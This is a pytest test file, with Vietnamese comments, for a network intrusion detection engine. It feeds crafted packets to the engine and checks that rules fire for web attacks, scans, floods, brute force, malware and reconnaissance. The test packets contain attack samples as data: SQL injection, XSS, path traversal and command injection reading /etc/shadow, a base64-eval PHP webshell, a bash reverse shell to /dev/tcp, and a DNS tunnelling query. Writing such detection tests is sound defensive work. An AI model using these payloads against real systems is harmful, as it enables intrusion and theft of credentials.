import time
import pytest
from nids.engine.packet import DecodedPacket, ParsedHTTPRequest
from nids.engine.rule_manager import RuleManager
from nids.engine.detector import DetectionEngine


def make_tcp_packet(
    src_ip="192.168.1.100",
    dst_ip="10.0.0.5",
    sport=50000,
    dport=80,
    flags="PA",
    payload=b"",
    http_data=None,
) -> DecodedPacket:
    tcp_flags_dict = {
        "SYN": "S" in flags,
        "ACK": "A" in flags,
        "FIN": "F" in flags,
        "RST": "R" in flags,
        "PSH": "P" in flags,
        "URG": "U" in flags,
        "raw_flags": flags,
    }
    return DecodedPacket(
        timestamp=time.time(),
        src_ip=src_ip,
        dst_ip=dst_ip,
        src_port=sport,
        dst_port=dport,
        protocol="TCP",
        tcp_flags=tcp_flags_dict,
        raw_payload=payload,
        http_data=http_data,
    )


def make_udp_packet(
    src_ip="192.168.1.100",
    dst_ip="10.0.0.5",
    sport=50000,
    dport=53,
    payload=b"",
) -> DecodedPacket:
    return DecodedPacket(
        timestamp=time.time(),
        src_ip=src_ip,
        dst_ip=dst_ip,
        src_port=sport,
        dst_port=dport,
        protocol="UDP",
        tcp_flags={},
        raw_payload=payload,
        http_data=None,
    )


def make_icmp_packet(
    src_ip="192.168.1.100",
    dst_ip="10.0.0.5",
    icmp_type=8,
    icmp_code=0,
    payload=b"",
) -> DecodedPacket:
    return DecodedPacket(
        timestamp=time.time(),
        src_ip=src_ip,
        dst_ip=dst_ip,
        src_port=None,
        dst_port=None,
        protocol="ICMP",
        tcp_flags={},
        icmp_type=icmp_type,
        icmp_code=icmp_code,
        raw_payload=payload,
        http_data=None,
    )


def make_http_packet(
    method="GET",
    uri="/",
    headers=None,
    body="",
    src_ip="192.168.1.100",
    dst_ip="10.0.0.5",
    sport=50000,
    dport=80,
) -> DecodedPacket:
    headers = headers or {"host": "victim.local"}
    http_data = ParsedHTTPRequest(
        method=method.upper(),
        uri=uri,
        path=uri.split("?")[0],
        query_params=uri.split("?")[1] if "?" in uri else "",
        headers=headers,
        body=body,
    )
    raw = f"{method} {uri} HTTP/1.1\r\n".encode("latin-1")
    for k, v in headers.items():
        raw += f"{k}: {v}\r\n".encode("latin-1")
    raw += b"\r\n" + body.encode("latin-1")
    return make_tcp_packet(
        src_ip=src_ip,
        dst_ip=dst_ip,
        sport=sport,
        dport=dport,
        flags="PA",
        payload=raw,
        http_data=http_data,
    )


@pytest.fixture(scope="module")
def real_engine():
    """Khởi tạo DetectionEngine nạp toàn bộ tập luật thực tế từ rules/local.rules."""
    manager = RuleManager("rules")
    manager.load_all_rules()
    # Tắt threshold để kiểm thử so khớp thuần túy
    engine = DetectionEngine(manager, enable_threshold=False)
    return engine


# ── 1. KIỂM THỬ TẤN CÔNG WEB (SID 10000xx) ────────────────────────────

def test_web_sqli_union_select(real_engine):
    pkt = make_http_packet(uri="/search?q=1'+union+select+1,2--")
    matched = real_engine.evaluate_packet(pkt)
    assert any(r.sid == 1000001 for r in matched)


def test_web_xss_script_tag(real_engine):
    pkt = make_http_packet(uri="/comment?text=<script>alert('xss')</script>")
    matched = real_engine.evaluate_packet(pkt)
    assert any(r.sid == 1000010 for r in matched)


def test_web_path_traversal(real_engine):
    pkt = make_http_packet(uri="/download?file=../../../../etc/passwd")
    matched = real_engine.evaluate_packet(pkt)
    assert any(r.sid == 1000020 for r in matched)
    assert any(r.sid == 1000021 for r in matched)


# ── 2. KIỂM THỬ QUÉT MẠNG (SID 10001xx) ─────────────────────────────

def test_scan_nmap_xmas(real_engine):
    pkt = make_tcp_packet(flags="FPU", dport=80)
    matched = real_engine.evaluate_packet(pkt)
    assert any(r.sid == 1000100 for r in matched)


def test_scan_nmap_null(real_engine):
    pkt = make_tcp_packet(flags="", dport=443)
    matched = real_engine.evaluate_packet(pkt)
    assert any(r.sid == 1000101 for r in matched)


# ── 3. KIỂM THỬ TỪ CHỐI DỊCH VỤ (SID 10002xx) ─────────────────────────

def test_dos_syn_flood(real_engine):
    # detection_filter: count 10, seconds 1 -> 10 SYN đầu chưa bắn, SYN thứ 11 mới bắn
    pkt = make_tcp_packet(dst_ip="10.0.0.201", flags="S", dport=80)
    for _ in range(10):
        assert not any(r.sid == 1000201 for r in real_engine.evaluate_packet(pkt))
    matched = real_engine.evaluate_packet(pkt)
    assert any(r.sid == 1000201 for r in matched)


def test_dos_syn_flood_ignores_syn_ack(real_engine):
    pkt = make_tcp_packet(dst_ip="10.0.0.202", flags="SA", dport=80)
    for _ in range(11):
        assert not any(r.sid == 1000201 for r in real_engine.evaluate_packet(pkt))


def test_dos_slowloris_probe(real_engine):
    pkt = make_http_packet(headers={"host": "victim.local", "X-a": "b"})
    matched = real_engine.evaluate_packet(pkt)
    assert any(r.sid == 1000202 for r in matched)


def test_dos_icmp_oversized(real_engine):
    pkt = make_icmp_packet(payload=b"A" * 1000)
    matched = real_engine.evaluate_packet(pkt)
    assert any(r.sid == 1000203 for r in matched)

    normal_ping = make_icmp_packet(payload=b"PingPingPingPing")
    assert not real_engine.evaluate_packet(normal_ping)


# ── 4. KIỂM THỬ DÒ QUÉT MẬT KHẨU (SID 10003xx) ────────────────────────

def test_brute_ssh_probe(real_engine):
    pkt = make_tcp_packet(dport=22, payload=b"SSH-2.0-OpenSSH_8.9\r\n")
    matched = real_engine.evaluate_packet(pkt)
    assert any(r.sid == 1000301 for r in matched)


def test_brute_ftp_anonymous(real_engine):
    pkt = make_tcp_packet(dport=21, payload=b"USER anonymous\r\n")
    matched = real_engine.evaluate_packet(pkt)
    assert any(r.sid == 1000302 for r in matched)


def test_brute_http_basic_auth(real_engine):
    pkt = make_http_packet(headers={"host": "victim.local", "authorization": "Basic YWRtaW46cGFzc3dvcmQ="})
    matched = real_engine.evaluate_packet(pkt)
    assert any(r.sid == 1000303 for r in matched)


# ── 5. KIỂM THỬ MÃ ĐỘC & C2 (SID 10004xx) ──────────────────────────────

def test_malware_php_webshell(real_engine):
    pkt = make_http_packet(
        method="POST",
        uri="/shell.php",
        body="<?php eval(base64_decode('cGhwaW5mbygpOw==')); ?>",
    )
    matched = real_engine.evaluate_packet(pkt)
    assert any(r.sid == 1000401 for r in matched)


def test_malware_linux_reverse_shell(real_engine):
    pkt = make_tcp_packet(dport=4444, payload=b"/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
    matched = real_engine.evaluate_packet(pkt)
    assert any(r.sid == 1000402 for r in matched)


def test_c2_sqlmap_user_agent(real_engine):
    pkt = make_http_packet(headers={"host": "victim.local", "user-agent": "sqlmap/1.7#stable"})
    matched = real_engine.evaluate_packet(pkt)
    assert any(r.sid == 1000404 for r in matched)


# ── 6. KIỂM THỬ THĂM DÒ UDP & ICMP (SID 10005xx) ─────────────────────────

def test_recon_snmp_public_community(real_engine):
    pkt = make_udp_packet(dport=161, payload=b"\x30\x29\x02\x01\x01\x04\x06public\xa0")
    matched = real_engine.evaluate_packet(pkt)
    assert any(r.sid == 1000501 for r in matched)


def test_recon_dns_tunneling(real_engine):
    pkt = make_udp_packet(dport=53, payload=b"\x00\x01\x01\x00\x00\x01\x07exfil01\x08c2tunnel\x02io\x00")
    matched = real_engine.evaluate_packet(pkt)
    assert any(r.sid == 1000502 for r in matched)


def test_recon_icmp_timestamp(real_engine):
    pkt = make_icmp_packet(icmp_type=13)
    matched = real_engine.evaluate_packet(pkt)
    assert any(r.sid == 1000503 for r in matched)


def test_web_command_injection(real_engine):
    pkt = make_http_packet(uri="/ping?host=127.0.0.1;cat+/etc/shadow")
    matched = real_engine.evaluate_packet(pkt)
    assert any(r.sid == 1000030 for r in matched)


def test_web_sqli_or_bypass_urlencoded(real_engine):
    pkt = make_http_packet(uri="/login?user=admin'+or+'1'%3D'1")
    matched = real_engine.evaluate_packet(pkt)
    assert any(r.sid == 1000002 for r in matched)


def test_auth_admin_login_requires_post(real_engine):
    post = make_http_packet(method="POST", uri="/admin/login")
    assert any(r.sid == 1000304 for r in real_engine.evaluate_packet(post))

    get = make_http_packet(method="GET", uri="/admin/login")
    assert not any(r.sid == 1000304 for r in real_engine.evaluate_packet(get))


# ── 7. KIỂM THỬ NÉ TRÁNH & BIẾN THỂ (Evasion & Edge Cases) ──────────────────

def test_evasion_nocase_and_port_list(real_engine):
    # Mixed case SQLi
    pkt_mixed = make_http_packet(dport=8080, uri="/search?q=1'+uNiOn+sElEcT+user,pass--")
    matched = real_engine.evaluate_packet(pkt_mixed)
    assert any(r.sid == 1000001 for r in matched)

    # Benign traffic (Không được phát sinh bất kỳ cảnh báo nào)
    pkt_benign = make_http_packet(dport=80, uri="/index.html")
    matched_benign = real_engine.evaluate_packet(pkt_benign)
    assert len(matched_benign) == 0


# ── 8. KIỂM THỬ CHỐNG BÃO CẢNH BÁO (Threshold Suppression) ─────────────────

def test_threshold_suppresses_alert_flood():
    manager = RuleManager("rules")
    manager.load_all_rules()

    alerts_received = []
    engine = DetectionEngine(
        manager,
        alert_callback=lambda a: alerts_received.append(a),
        enable_threshold=True,
        threshold_window_seconds=2.0,
    )

    pkt = make_tcp_packet(flags="FPU", dport=80)

    # Gửi liên tục 10 gói tin Xmas Scan
    for _ in range(10):
        engine.evaluate_packet(pkt)

    # Chỉ được nhận duy nhất 1 alert trong cửa sổ 2.0s
    assert len(alerts_received) == 1

    # Chờ hết cửa sổ thời gian
    time.sleep(2.1)

    # Gói tiếp theo được phép bắn alert và mang theo số lượng đã bị dồn
    engine.evaluate_packet(pkt)
    assert len(alerts_received) == 2
    assert alerts_received[1]["suppressed_hits"] == 9
